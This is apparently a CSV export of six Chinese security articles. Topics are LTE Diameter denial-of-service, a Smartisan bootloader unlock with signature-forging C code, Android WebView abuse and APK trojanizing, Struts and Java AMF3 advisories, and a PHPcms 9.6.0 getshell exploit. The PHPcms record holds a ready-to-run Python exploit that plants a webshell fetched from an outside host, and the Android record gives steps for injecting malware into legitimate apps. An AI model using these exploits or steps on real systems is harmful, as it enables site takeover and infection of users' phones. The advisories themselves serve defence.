"_id","abstract","author","content","published_date","tags","title","url"
"5ccbf9a2adf6273bfdfe18d0","诺基亚贝尔实验室和芬兰阿尔托大学的研究人员演示了如何攻击LTE网络协议。之前我们已经多次报道过SS7信号协议的漏洞了，利用协议的漏洞，攻击者可以追踪用户。当用户在各","root","诺基亚贝尔实验室和芬兰阿尔托大学的研究人员演示了如何攻击LTE网络协议。之前我们已经多次报道过SS7信号协议的漏洞了，利用协议的漏洞，攻击者可以追踪用户。当用户在各个国家旅游时，他们的手机会连接到当地运营商，然后再与用户本国的运营商联系。SS7协议能够用来漫游，但是这个协议存在漏洞，黑客可以利用漏洞来：跟踪位置监听诈骗对用户或网络发动DoS攻击窃取密码数据劫持短信拦截通过窃取一次性密码劫持Telegram、facebook、whatsapp的账号Diameter同样能被攻击Diameter被认为是LTE网络SS7协议的完善版本，理应更加安全，但专家们在这款协议中同样发现了安全问题，其中一个就是没有使用IPsec协议。研究人员表示，这就意味着Diameter能够被用同样的手段攻击。专家团队进行了数次测试评估攻击，测试中，他们对在芬兰的英国用户进行了网络攻击，发现了多种干扰服务的方法。攻击者可以选择暂时或永久地关闭用户连接，也可以针对某一整个地区实施攻击。研究团队在伦敦举行的黑帽大会上演示了成果。攻击过程要对其他运营商的系统或者用户进行攻击，研究人员首先得要能够访问IPX。他们演示了几种能够访问IPX的方法，比如政府可以强制本地的运营商给予权限。攻击者可以伪装成虚拟网络运营商，然后通过已有的运营商获得漫游网络的权限。也可以黑掉运营商的某个暴露在公网中的节点。我们来看看LTE网络的组成：LTE网络中的节点被称为MME（Mobility Management Entity，移动管理实体），它主要负责会话管理、用户验证、漫游以及将用户移交给其他网络。信号通过信号塔传播，同时归属用户服务器（HSS，Home Subscriber Server）负责存储用户的相关信息及其相关业务信息。LTE网络中的其他重要组件包括DEA（DiameterEdge Agents）负责在攻击中充当进入互联网络的网关。在实施攻击的过程中，黑客需要有受害者的IMSI，获取过程并不难：黑客可以伪装成短信服务中心，试图发送短信到受害者的手机号，从而获得IMSI。因此，只要知道对方的移动台ISDN号码(MSISDN)，知道对方运营商的DEA，就可以对其进行攻击了。攻击者首先通过DEA给HSS发送一个路由信息请求，而请求的回复中会包含用户的IMSI和用户连接的是哪个MME。接着，攻击者伪装成某个合作伙伴的HSS，向受害者的MME发送一条“取消位置请求(CLR)”的信息，导致用户断线。这个CLR信息原来是当用户从一个MME切换到另一个MME时发送的。多种攻击方式研究人员还提出了另一种漏洞的利用方法，通过这种方法可以“放大”请求。研究人员注意到当用户重新接入网络时，设备向MME发送20条不同的消息。如果攻击者强制让大量用户同时下线，当他们重新上线时，MME就会涌入大量消息，导致MME被DoS攻击，进而造成MME所负责的一大块区域停止服务。另一个DoS攻击场景是这样的：攻击者冒充HSS，向受害者的MME发送一条IDR（Insert Subscriber Data Request，插入用户数据请求）信息，信息的内容比较特别，是一个特殊的，表示无服务的值。这样用户就会永久被踢下网络。如果用户想要再次连接，唯一的办法就是联系移动运营商了。","2016-11-14 17:50:35","网络安全","如何利用LTE网络协议漏洞把手机踢下网","http://nsoad.com/Article/Network-security/20161114/769.html"
"5ccbf9a2adf6273bfdfe18d1","Smartisan是手机中为数不多倾心于工业设计和用户体验的。老罗跨界过猛，也难免导致其最初的想法和现实存在差距。bootloader到底锁还是不锁，甚至曾被一个T1用户弄上法庭来质问。","盘古Team","关于bootloader锁Smartisan是手机中为数不多倾心于工业设计和用户体验的。老罗跨界过猛，也难免导致其最初的想法和现实存在差距。bootloader到底锁还是不锁，甚至曾被一个T1用户弄上法庭来质问。当然，能从认为加锁是对系统的不自信，到后来发现解锁是安全隐患，绝对是个进步（loser口中的打脸）。技术层面来说，究竟T系列手机的bootloader能不能解锁呢？答案是，能。或者说，本来不能，但由于bootloader里存在的两个漏洞，恰好可解。分析bootloader正像Smartisan OS本身，其ROM目录结构也是极简的。firmware-update目录下emmc_appsboot.mbn就是bootloader镜像。由于是ELF格式，不需要更多的处理，就能逆向出不错的代码结构。无论是T1还是T2，bootloader的代码差不多，下面的分析选择的是T2的2.6版的ROM。和很多高通芯片的手机一样，T2的bootloader是基于高通开源的lk。所以参考源码，可以很快梳理出bootloader的执行流程。启动后，根据按键组合，决定是否进入recovery，如果继续留在bootloader模式，就会注册一系列fastboot command，循环等待用户输入，决定下一步动向，如图1。图1.注册fastboot command显然，control_flag为0的话，cmd_table中只有前四条命令被注册，后续命令就都无法使用了。通过观察cmd_table（如图2），可以发现那些真正令人激动的函数（比如oem unlock）都在比较靠后的位置上。图2.fastboot可以注册的命令列表在搞清楚control_flag这个全局标记到底何去何从之前，不如先探探这仅存四条命令的究竟。reboot，reboot-bootloader命令正像他们的名字一样无趣，flash看起来就很有故事了。执行flash命令时，如果control_flag为0，那就只能写一个名为security的分区。而control_flag为1时，所有其他分区就都可以写了，如图3所示：图3.写分区时的判断联想之前fastboot command注册的过程，control_flag为0时，绝大部分功能无效，且分区不可写，control_flag应该就是is_allow_unlock，即bootloader是否上锁的标记。系统启动时，is_allow_unlock默认置0。当flash了security分区后，is_allow_unlock会有一次赋值操作，并且一旦赋值为1，就会提示解锁成功，如图4所示：图4.对security分区的检测，判断是否可以解锁分析到这里基本可以肯定，T2提供了解锁功能，关键是写入security分区的内容是否能够经得住考验。解锁bootloaderverify_security()函数比较复杂，涉及很多密码学算法的演绎。好在它使用的是openssl的标准库函数，识别起来有章可循。security分区内容采用的是RSA+MD5签名校验。合理的猜测是，官方本来设计的解锁流程其他厂商类似，即用户提交手机的序列号等信息，然后通过unlock时输入厂商给的解锁码（根据序列号计算出来的签名信息），实现解锁。只不过这一次解锁码是通过写入security分区实现输入。security[128]（security分区第128字节）是RSA初始化函数选择的依据，security[129]作为序列号长度。然后factory[5]（factory分区的第5字节）起始的序列号作为MD5的计算依据，得到的hash值和security[0-127]签名信息验证的结果做比，相同返回1，否则返回0。这几乎是每个签名验证的都在用的标准化流程，采用的算法成熟，且由openssl实现（难怪发布会几百万门票钱捐给了openssl），基本不会有瑕疵。由于bootloader只存放了公钥e，没有私钥d，手机用户自己是没办法构造出128字节的签名信息的。不过，由于代码上一些不大不小的问题，我们恰好可以绕过这些限制，构造出和序列号无关的通用解锁码。首先在RSA初始化时，如图5和6，当security[128]为66和67以外的数值时，初始化函数被选择为sub_F924A90。图5.根据security[128]指定的函数来初始化RSA密钥图6.RSA密钥初始化跟进sub_F924A90后，可以看见图6所示的密钥填充，BN_bin2bn是openssl的库函数，用于将内存中存放的Big-Endian字符数组转化为Bignum类型，方便RSA的内部计算。私钥d填写的是伪数值，但p和q都填写的是真值。侧面说明写这段代码的人不太了解RSA，毕竟其安全性完全依赖于大数分解的NP难，而现在n的两个素数因子p和q都给了，虽然本意是加快计算速度，但私钥d也就因而可以从公钥e推出来了，d=e-1mod (p-1)(q-1)，这就导致了第一个逻辑漏洞，用于伪造签名。接下来，如图7，完成了RSA的初始化以后，会接着从factory分区读取数据：图7. 读取factory分区，得到序列号，然后计算MD5究竟从factory分区读取多少字节是可控的，由security[129]决定。读取出来正常应该是一串字母开头后接一串数字的序列号，MD5后得到一串16字节的hash。最后利用RSA的公钥验证security[0-127]的128字节签名是否属于hash。由于security[129]完全可控，就导致了第二个逻辑漏洞。如果该数指定为0，则MD5是针对一个空字符串进行计算的，计算结果总是d41d8cd98f00b204e9800998ecf8427e。所以无论是哪台手机，factory分区内容如何，签名验证将总是针对常量进行。只要构造该常量的签名写入security分区，就能够完成解锁。为了减少padding，encoding等一系列开发可能造成的不确定性，在生成解锁码时，同样采用openssl的代码实现，示例如下：#include #include #include #include #include unsigned char m3_n[128] = {\0xA4,0x0C, 0x69, 0x70, 0x25, 0x4F, 0x36, 0x49, 0x8E,\0x83,0x4B, 0x74, 0x9A, 0x75, 0xC9, 0xF4, 0x7F, 0xE5,\0x62,0xA8, 0xDE, 0x11, 0x13, 0x03, 0x57, 0x89, 0x31,\0xCB,0x58, 0x84, 0xC8, 0x26, 0xBA, 0x2B, 0x60, 0xB5,\0xB8, 0xA5, 0xD9, 0xBD, 0x27, 0x48, 0x3D,0x33, 0x38,\0xA1,0x72, 0x62, 0x64, 0x87, 0x5E, 0x71, 0xF4, 0x1F,\0xCB,0x68, 0x83, 0x92, 0xEA, 0x4B, 0xFF, 0x06, 0x38,\0xAF,0xD5, 0x65, 0x55, 0x94, 0x04, 0x91, 0x88, 0xF7,\0xA4,0x57, 0x72, 0x29, 0xFE, 0xEA, 0xB1, 0x27, 0x25,\0xC1,0x12, 0x7D, 0x16, 0x6F, 0x13, 0xAF, 0xE2, 0x00,\0x8D,0x5E, 0xA4, 0x0A, 0xB6, 0xF3, 0x71, 0x97, 0xC0,\0xB0,0x60, 0xF5, 0x7C, 0x7F, 0xAA, 0xC4, 0x64, 0x20,\0x3F,0x52, 0x0A, 0xA3, 0xC3, 0xEF, 0x18, 0xB6, 0x45,\0x7D,0x72, 0x1E, 0xE2, 0x61, 0x0C, 0xD0, 0xD9, 0x1D,\0xD0,0x5B\};unsigned char m3_e[1] = {3};unsigned char m3_d[128] = {\0x6d,0x5d,0x9b,0xa0,0x18,0xdf,0x79,0x86,0x5f,0x02,0x32,0x4d,0xbc,0x4e,0x86,0xa2,\0xff,0xee,0x41,0xc5,0xe9,0x60,0xb7,0x57,0x8f,0xb0,0xcb,0xdc,0xe5,0xad,0xda,0xc4,\0x7c,0x1c,0xeb,0x23,0xd0,0x6e,0x91,0x28,0xc4,0xda,0xd3,0x77,0x7b,0x16,0x4c,0x41,\0x98,0x5a,0x3e,0xf6,0xa2,0xbf,0xdc,0xf0,0x57,0xb7,0x46,0xdd,0x54,0xae,0xd0,0x74,\0x27,0xaa,0xad,0xf9,0xb9,0x33,0x8f,0x29,0x3b,0xf2,0xee,0x97,0x03,0x0b,0x5c,0xfc,\0x92,0x95,0x6f,0x05,0xcd,0xbf,0x1c,0x77,0x16,0xce,0xd9,0x13,0xfb,0xf2,0x8f,0x74,\0x09,0xca,0x78,0xf0,0xc7,0x4a,0xc2,0xc5,0xed,0x58,0xc1,0xfa,0xa1,0x6f,0x64,0x26,\0x73,0x75,0x73,0x97,0x21,0xb4,0x01,0x13,0xad,0xd7,0xd5,0xbc,0x22,0x75,0x00,0xcb,\};int main(int argc, char*argv[]) {MD5_CTX md5ctx;unsigned chardigest[MD5_DIGEST_LENGTH];unsigned charsigret[128];unsigned int siglen;unsigned chartestdata;MD5_Init(&amp;md5ctx);MD5_Update(&amp;md5ctx, &amp;testdata, 0);MD5_Final(digest, &amp;md5ctx);RSA *rsa =RSA_new();rsa-&gt;n =BN_bin2bn(m3_n, 128, rsa-&gt;n);rsa-&gt;e =BN_bin2bn(m3_e, 1, rsa-&gt;e);rsa-&gt;d =BN_bin2bn(m3_d, 128, rsa-&gt;d);RSA_sign(4,digest, 16, sigret, &amp;siglen, rsa);FILE *fp =fopen(“security.img”,”wb”);fwrite(sigret, siglen, 1, fp);fwrite(“\x40\x00”, 2, 1, fp);fclose(fp);return 0;}刷入security.img后，手机就可以解锁了。虽然上述分析是基于T2的ROM，T1也完全适用。如图8所示，T1刷入security.img同样可以解锁。图8. T1刷入security.img后解锁图9.T2刷入security.img后解锁And Then Some2014年老罗在微博上提过关于bootloader方面的打算，“官方会提供 boot loader，方便你刷机，只是刷机后会失保”，所以初代ROM里的确如我们所见保留了解锁bootloader的功能。2016年有人因为提供解锁而状告Smartisan，老罗胜诉后说道“我在微博上说过做bootloader，但技术部门因安全考虑否决了，我代表我自己道歉。”，所以肯定是取消了该功能。尽管官方从来没有发布过任何解锁的方法，底层代码倒是可以清晰反映出这段经历。对于T1和T2，2.6.7是最后一个可以解锁的ROM版本号，2.6.8开始，fastboot command列表被改写为图10所示内容，大部分指令被阉：图10. 2.6.8后的版本中fastboot已经没有什么实质功能了所以如果要解锁3.x的Smartisan OS，可以下载2.6.7的ROM完成降级，毕竟旧版本的ROM同样带有签名，使用recovery时允许刷入手机。更新到旧版的bootloader后，再用fastboot flash security security.img进行解锁。解锁后，每次升级用第三方无签名验证的recovery，更新除bootloader以外的模块即可。这样即便最新系统暂时没有公开的内核漏洞，也能root。一般的Android手机，只要有签名认证的老版本bootloader里有漏洞，在系统没有开启限制（比如SW_ID）时，总可以通过降级，解锁，然后升级回新系统，刷入supersu的方式root。","2017-02-06 20:18:19","移动安全","利用漏洞解锁锤子T1/2手机的bootloader","http://nsoad.com/Article/MobileSecurity/20170206/1051.html"
"5ccbf9a2adf6273bfdfe18d2","在本章中，我们将了解一些不太知名的 Android 攻击向量，这在 Android 渗透测试中可能很有用。 我们还将涵盖一些主题，如 Android 广告库中的漏洞和 WebView 实现中的漏洞。","Aditya Gupta","本文来源：看雪学院  编译作者：飞龙使者   原文：Learning Pentesting for Android Devices  网络攻防小组Kong.整理发布在本章中，我们将了解一些不太知名的 Android 攻击向量，这在 Android 渗透测试中可能很有用。 我们还将涵盖一些主题，如 Android 广告库中的漏洞和 WebView 实现中的漏洞。 作为渗透测试者，本章将帮助你以更有效的方式审计 Android 应用程序，并发现一些不常见的缺陷。7.1 Android WebView 漏 洞WebView 是一种 Android 视图，用于在应用程序中显示 Web 内容。 它使用 WebKit 渲染引擎，以便使用 file// 和 data// 协议显示网页和其他内容，可以用于从文件系统加载文件和数据内容。WebView 也用于各种 Android 应用程序，例如提供注册和登录功能的应用程序。它通过在应用程序的布局中构建其移动网站，来显示应用程序中的 Web 内容。 我们将在下一章中进一步讨论 WebKit 及其渲染引擎。 对于本章，我们将只关心使用 WebKit 的那些应用程序。在应用中使用 WebView在应用程序中使用 WebView 非常简单和直接。 假设我们希望我们的整个活动都是一个 WebView 组件，从 http://examplewebsite.com 加载内容。下面是在 Android 应用程序中实现 WebView 的代码示例：WebView webview = new WebView(this);setContentView(webview);webview.loadUrl(""http://vulnerable-website.com"");另一个重要的事情是，大多数开发人员最终为了增强应用程序的功能，在 WebView 实现中使用以下命令启用 JavaScript（默认设置为 False）：setJavascriptEnabled(true);前面的命令确保 JavaScript 可以在应用程序中执行，并利用注册界面。识 别 漏 洞想象一下这种情况，应用程序在不安全的网络中使用，允许攻击者执行中间人攻击（更多中间人攻击的内容请参见 OWASP 网站 https//www.owasp.org/index.PHP/Man-in-the-middle_attack）。 如果攻击者可以访问网络，则他们可以修改请求和对设备的响应。 这表示他们能够修改响应数据，并且如果从网站加载 JavaScript 内容，则可以完全控制 JavaScript 内容。事实上，通过使用它，攻击者甚至可以使用 JavaScript 来调用手机上的某些方法，例如向另一个号码发送短信，拨打电话，甚至使用诸如 Drozer 之类的工具获取远程 shell。让我们举个简单的例子，来说明 WebView 漏洞的可能性。 在这里，我们将使用 Joshua Drake 的 GitHub 仓库（https://github.com/jduck/VulnWebView/）中的，由他创建的概念证明。 这个 POC 在应用程序中使用WebView，来简单加载一个 URL 并且加载一个位于 http://droidsec.org/addjsif.html 的网页（如果这个链接打不开，你可以访问 http//attify.com/lpfa/addjsif.html）。以下是 Eclipse 中代码示例的屏幕截图，其中使用名称 Android 创建 JavaScript 界面：我们还可以从源代码中创建 apk 文件，只需右键单击项目，然后选择 Export as an Android Application（导出为 Android 应用程序）。 一旦我们运行应用程序并监听 Burp 代理中的流量，我们将看到应用程序中指定的 URL 的请求，如以下屏幕截图所示：现在，当响应来自服务器时，我们可以修改响应数据并使用它来利用此漏洞，如以下屏幕所示让我们假设攻击者需要利用这个漏洞应用程序，来使用受害者的设备向一个号码发送短信。 以下屏幕截图显示了修改后的响应的样子：一旦我们点击 Forward（转发）按钮，邮件将从受害者的设备发送到攻击者指定的号码。上述内容简单地调用 SMSManager()，以便将包含文本 pwned 的 SMS 发送到的预定义号码。这是一个利用存在漏洞的 WebView 应用程序的简单示例。 事实上，你可以尝试调用不同的方法或使用 Drozer 从设备获取远程 shell。 你还可以访问https://labs.mwrinfosecurity.com/blog/2013/09/24/webview-addjavascriptinterface-remote-code-execution/ 阅读通过 Drozer 利用 WebView 的更多信息。7.2 感 染 合 法 APK由于 Google 的不严格政策，将应用上传到 Play 商店时，许多开发人员上传了恶意应用和软件，目的是从使用者的装置窃取私人资料。 Google Play 中存在的大多数恶意软件只是合法应用程序的受感染版本。恶意软件作者只需要一个真正的应用程序，反编译它，插入自己的恶意组件，然后重新编译它，以便分发到应用商店和感染用户。这可能听起来很复杂，但实际上，这是一个非常简单的事情。让我们尝试分析恶意软件作者如何修改合法应用程序，来创建它的受感染版本。执行此操作的最简单的方法之一是编写一个简单的恶意应用程序，并将其所有恶意活动放在服务中。此外，我们在 AndroidManifest.xml 文件中添加广播接收器，以便指定的事件（例如接收 SMS）能够触发我们的服务。因此，以下是创建受感染版本的合法应用程序的简单步骤：使用 apktool 解压缩应用程序，如下所示：apktool d [appname].apk反编译恶意应用程序来生成 Java 类的 smali 文件。 在这里，我们需要将所有的恶意活动放在服务中。 此外，如果你有 smali 语言的经验，你可以直接从 smali 本身创建服务。 假设恶意服务的名称是 malware.smali。接下来，我们需要将 malware.smali 文件复制到 smali 文件夹，它位于我们反编译的合法应用程序的文件夹中 。我们把 malware.smali 中的软件包名称的所有引用更改为合法应用程序的软件包名称，并在 AndroidManifest.xml 中注册服务。在这里，我们需要在 AndroidManifest.xml 文件中添加另一行，如下所示：&lt;service droid:name = ""malware.java""/&gt;此外，我们需要注册一个广播接收器来触发服务。 在这种情况下，我们选择短信作为触发器，如下面的代码所示：&lt;receiver android:name=""com.legitimate.application.service""&gt;      &lt;intent-filter&gt;        &lt;action android:name=""android.provider.Telephony.SMS_RECEIVED"" /&gt;    &lt;/intent-filter&gt;&lt;/receiver&gt;使用 apktool 重新编译应用，像这样：apktool b appname/一旦应用程序使用 apktool 重新编译，新的 apk 将为被感染的合法版本。 向手机发送邮件可能会自动触发此恶意软件。 如果恶意软件服务需要的权限比合法应用程序更多，我们还需要手动在 AndroidManifest.xml 文件中添加缺少的权限。7.3 广 告 库 中 的 漏 洞Google Play上提供的大部分免费 Android 应用都会使用广告来赚取收益。 然而，通常广告库本身存在漏洞，使得整个应用程序容易受到某种严重的威胁。为了识别特定应用程序中存在的广告库，我们可以使用 dex2jar/apktool 简单地反编译该应用程序，并分析创建的文件夹。 你还可以在 http://www.appbrain.com/stats/libraries/ad 中找到一些最受欢迎的 Android 广告库和使用它们的应用程序。 广告库可能具有许多漏洞，例如上一节中讨论的 WebView 漏洞，不安全的文件权限或任何其他漏洞，这可能会导致攻击者破坏整个应用程序，获得反向 shell 或甚至创建后门。7.4 Android 中 的 跨 应 用 脚 本跨应用程序脚本漏洞是一种 Android 应用程序漏洞，攻击者可以绕过同源策略并在应用程序位置中访问存储在 Android 文件系统上的敏感文件。 这意味着攻击者能够访问位于/data/data/[应用程序包名称]位置中的所有内容。 漏洞的根本原因是，应用程序允许内容使用受信任区域的访问权限，在不受信任区域中执行。如果漏洞应用程序是 Web 浏览器，攻击会变得更加严重，其中攻击者能够静默窃取浏览器存储的所有 Cookie 和其他信息，并将其发送给攻击者。甚至一些著名的应用程序，如 Skype，Dropbox，海豚浏览器等，早期版本中都存在跨应用程序脚本漏洞。让我们来看看海豚浏览器 HD 中的漏洞，例如，由 Roee Hay 和 Yair Amit 发现的漏洞。 此示例中使用的存在漏洞的海豚浏览器 HD 应用程序版本为 6.0.0，以后的版本中修补了漏洞。海豚浏览器 HD 有一个名为 BrowserActivity 的漏洞活动，它可以被其他应用程序以及其他参数调用。 攻击者可以使用它来调用海豚浏览器 HD 并打开特定的网页，以及恶意的 JavaScript。 以下屏幕截图显示了 POC 代码以及通报（http://packetstormsecurity.com/files/view/105258/dolphin-xas.txt）：这里，使用屏幕截图中的上述代码，我们将打开 http://adityagupta.NET 网站以及 JavaScript 函数 alert(document.domain)，它将在提示框中简单地弹出域名。 一旦我们在我们的手机上打开这个恶意应用程序，它将调用海豚浏览器 HD，打开 URL 和我们指定的 JavaScript 代码，如下面的截图所示：总 结在本章中，我们了解了 Android 中的不同攻击向量，从渗透测试者的角度来看，这非常有用。 本章应该用做对不同攻击向量的快速演练; 然而，建议你尝试这些攻击向量，尝试修改它们，并在现实生活中的渗透测试中使用它们。在下一章中，我们将离开应用程序层，专注于 Android 平台的基于 ARM 的利用。","2017-03-03 22:34:19","移动安全","Android 渗透测试学习手册（七）不太知名的 Android 漏洞","http://nsoad.com/Article/MobileSecurity/20170303/1092.html"
"5ccbf9b74f2f0a0a7a69bfad","2017年12月1日下午，Apache Strusts发布漏洞编号为CVE-2017-7525（S2-055）的安全漏洞，漏洞危害程度为中等（Moderate）。","silence","1.漏洞概述S2-054漏洞简述：2017年12月1日，Apache Strusts发布漏洞编号为CVE-2017-15707（S2-054）的安全漏洞，漏洞危害程度为中等（Moderate）。由于Apache Struts REST插件使用了过时的JSON-lib库，这个库很容易受到攻击，攻击者可以通过构造特制的JSON恶意请求造成DOS攻击。https://cwiki.apache.org/confluence/display/WW/S2-054S2-055漏洞简述：2017年12月1日下午，Apache Strusts发布漏洞编号为CVE-2017-7525（S2-055）的安全漏洞，漏洞危害程度为中等（Moderate）。由于Apache Struts调用了存在反序列化漏洞的Jackson JSON库，导致了反序列化漏洞的产生。https://cwiki.apache.org/confluence/display/WW/S2-0552.漏洞基本信息产生原因Apache Struts REST插件使用了过时的JSON-lib库影响范围Struts 2.5 – Struts 2.5.14漏洞危害中危漏洞IDCVE-2017-15707（S2-054）产生原因Apache Struts调用了存在反序列化漏洞的Jackson JSON库影响范围Struts 2.5 – Struts 2.5.14漏洞危害中危漏洞危害CVE-2017-7525（S2-055）3.修复建议s2-054修复建议：方法一：升级到Apache Struts版本2.5.14.1。方法二：使用Jackson处理程序替换默认的JSON-lib处理程序，替换方法：http://struts.apache.org/plugins/rest/#use-jackson-framework-as-json-contenttypehandlers2-055修复建议：方法一：升级到Apache Struts版本2.5.14.1。方法二：手动将项目中的com.fasterxml.jackson升级到版本2.9.2，具体查看：https://github.com/FasterXML/jackson-databind/issues/1599#issuecomment-342983770","2017-12-04","漏洞发布","【漏洞预警】Apache Struts2 再爆漏洞(ST2-054，ST2-055) 通告","http://nsoad.com/Article/exploit/20171204/vulzone-58.html"
"5ccbf9b74f2f0a0a7a69bfae","PHPcms9.6.0 最新版任意文件上传漏洞利用方式","三少","*原创作者：三少，本文属FreeBuf原创奖励计划，未经许可禁止转载对于PHPcms9.6.0 最新版漏洞，具体利用步骤如下：首先我们在本地搭建一个php环境，我这里是appserv（只要可以执行php文件就行）在根目录下新建一个txt文本文件里面写上php一句话，如上图可以访问接着我们找到phpcms网站注册模块，随便填一下信息然后我们用burpsuite抓包然后发送到repeater我们在最下面的注册那儿使用img标签插入我们本地第一步搭建的一句话poc如下：siteid=1&amp;modelid=11&amp;username=zf1agac121&amp;password=aasgfaewee311as&amp;email=a1ea21f94@qq.com&amp;info[content]=&lt;img src=http://192.168.1.157/templets/1.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=只需要修改img里面的链接为你本地写入的一句话即可，还有要注意的是在repeater里测试go时每一次都要修改username，password和email字段值（不能重复，汗）我们可以看到repeater里MYSQL query成功插入，接着访问上图repeater里我标黄语句，执行一句话连接菜刀，getshell利用方式二：利用火狐的插件，操作如下exp如下：三少# -*- coding:utf-8 -*-import requestsimport sysfrom datetime import datetimedef getTime():    year = str(datetime.now().year)    month = ""%02d"" % datetime.now().month    day = ""%02d"" % datetime.now().day    hour = datetime.now().hour    hour = hour - 12 if hour &gt; 12 else hour    hour = ""%02d"" % hour    minute = ""%02d"" % datetime.now().minute    second = ""%02d"" % datetime.now().second    microsecond = ""%06d"" % datetime.now().microsecond    microsecond = microsecond[:3]    nowTime = year + month + day + hour + minute + second + microsecond    return int(nowTime), year + ""/"" + month + day + ""/""def main():    if len(sys.argv) &lt; 2:        print(""[*]Usage   : Python 1.py http://xxx.com"")        sys.exit()    host = sys.argv[1]    url = host + ""/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1""    data = {        ""siteid"": ""1"",        ""modelid"": ""1"",        ""username"": ""dsakkfaffdssdudi"",        ""password"": ""123456"",        ""email"": ""dsakkfddsjdi@qq.com"",        # 如果想使用回调的可以使用http://file.codecat.one/oneword.txt，一句话地址为.php后面加上e=YXNzZXJ0        ""info[content]"": ""&lt;img src=http://file.codecat.one/normalOneWord.txt?.php#.jpg&gt;"",        ""dosubmit"": ""1"",        ""protocol"": """",    }    try:        startTime, _ = getTime()        htmlContent = requests.post(url, data=data)        finishTime, dateUrl = getTime()        if ""MySQL Error"" in htmlContent.text and ""http"" in htmlContent.text:            successUrl = htmlContent.text[htmlContent.text.index(""http""):htmlContent.text.index("".php"")] + "".php""            print(""[*]Shell  : %s"" % successUrl)        else:            print(""[-]Notice : writing remoteShell successfully, but failing to get the echo. You can wait the program crawl the uploadfile(in 1-3 second)，or re-run the program after modifying value of username and email.\n"")            successUrl = """"            for t in range(startTime, finishTime):                checkUrlHtml = requests.get(                    host + ""/uploadfile/"" + dateUrl + str(t) + "".php"")                if checkUrlHtml.status_code == 200:                    successUrl = host + ""/uploadfile/"" + \                        dateUrl + str(t) + "".php""                    print(""[*]Shell  : %s"" % successUrl)                    break            if successUrl == """":                print(                    ""[x]Failed : had crawled all possible url, but i can't find out it. So it's failed.\n"")    except:        print(""Request Error"")if __name__ == '__main__':    main()","2017-04-11","漏洞发布","PHPcms9.6.0 最新版任意文件上传漏洞（直接getshell）","http://nsoad.com/Article/exploit/20170411/vulzone-55.html"
"5ccbf9b74f2f0a0a7a69bfaf","德国安全团队@codewhitesec发现了Java AMF3的多个功能实现漏洞，美国CERT/CC也发出了安全预警。","clouds","期，德国安全团队@codewhitesec发现了Java AMF3的多个功能实现漏洞，美国CERT/CC也发出了安全预警。攻击者可以远程通过欺骗或控制服务连接方式，在AMF3反序列动作时执行任意代码。部分受影响产品的补丁已经发布。AMF3实际上是Adobe Action Message Format的最新版本，是用于对ActionScript对象图形序列化的压缩二进制格式。AMF首次出现是在2001年的Flash Player 6之中，而AMF3则伴随Flash Player 9出现。序列化是指，一个对象转为字节流的过程，以便将对象存储或传输到内存或文件中。而序列化的数据释放的过程就是反序列化——这个过程如果处理不到位就会出现重大安全问题。CERT/CC的安全公告提到了3个漏洞，第一个漏洞可让攻击者欺骗或控制RMI（Remote Method Invocation）服务器来执行代码。第二个漏洞则可被攻击者利用实现任意代码执行——该漏洞影响到了Flamingo，Apache的Flex BlazeDS和GraniteDS。XXE漏洞也影响到了这些产品，另外还有WebORB。详情如下：漏洞概述Java AMF3功能存在不安全的反序列化和XML外部实体注入漏洞，导致多个应用程序产品受到影响，漏洞概要参见KB-CERT VU#307983，详细技术分析参见codewhitesec博客。漏洞描述不可信数据的反序列化漏洞一些Java AMF3反序列化器实现不是从推荐规范类flash.utils.IExternalizable，而是从java.io.Externalizable中派生类实例。因此，远程攻击者可以通过欺骗或控制用来序列化Java对象的RMI服务连接，实现反序列化动作时执行任意代码。一些Java AMF3反序列化器不是从推荐规范类flash.utils.IExternalizable，而是从java.io.Externalizable中派生类实例。因此，远程攻击者可以通过欺骗或控制用来序列化Java对象的RMI服务连接，实现反序列化动作时执行任意代码。受该漏洞影响的产品程序和CVE编号如下：Atlassian JIRA, 4.2.4至6.3.0版本 – CVE-2017-5983Flamingo amf-serializer by Exadel, 2.2.0版本 – CVE-2017-3201GraniteDS, 3.1.1.GA版本 – CVE-2017-3199Pivotal/Spring spring-flex – CVE-2017-3203WebORB for Java by Midnight Coders, 5.1.1.0版本 – CVE-2017-3207使用以上这些库程序的其它产品也可能将受到影响。动态托管代码资源的不正确控制漏洞一些Java AMF3反序列化器实现可以通过其公开的无参数构造函数构造任意类实例，或调用任意Java Beans setter方法。漏洞的可利用情况于取决于使用反序列化的类路径中的类的可用性。远程攻击者可以发送预先设置好的序列化java对象，以欺骗或控制方式在反序列动作时执行任意代码。受该漏洞影响的产品程序和CVE编号如下：Flamingo amf-serializer by Exadel, 2.2.0版本 – CVE-2017-3202Flex BlazeDS , 4.6.0.23207版本和4.7.2版本 – CVE-2017-5641GraniteDS, 3.1.1.GA版本 – CVE-2017-3200使用以上这些库程序的其它产品也可能将受到影响。XML外部实体引用的不当限制漏洞（XXE漏洞）一些Java AMF3反序列化器实现允许从AMF3消息嵌入的XML文件中执行外部实体引用，一旦XML解析发生错误处理，将会泄露服务器敏感信息，同时也会导致DDoS、SSRF服务器端请求伪造攻击。受该漏洞影响的产品程序和CVE编号如下：Flex BlazeDS , 4.6.0.23207版本 – CVE-2015-3269GraniteDS, 3.1.1.GA版本 – CVE-2016-2340 (see VU#279472)WebORB for Java by Midnight Coders, 5.1.1.0版本 – CVE-2017-3208使用以上这些库程序的其它产品也可能将受到影响。漏洞影响攻击者可以远程通过欺骗或控制服务连接，发送序列化的java对象，在反序列动作时执行任意代码。解决方案程序更新至最新版本；程序开发者应该使用更新版本的JDK程序，如JDK 8 update 121、JDK 7 update 131 和JDK 6 update 141中都包含了序列化黑名单过滤器，而即将发布的JDK9则更安全；开发者应该提高对不信任来源反序列化数据的安全警惕；配置防火墙规则或文件系统限制。目前受影响的供应商信息部分库如GraniteDS和Flamingo都已经不再受支持；而Atlassian和Apache则已经针对自家产品发布了补丁。CERT/CC表示，HPE、SonicWall和VMware的产品可能也受到影响。","2017-04-07","漏洞发布","Java AMF3曝远程代码执行漏洞","http://nsoad.com/Article/exploit/20170407/vulzone-54.html"
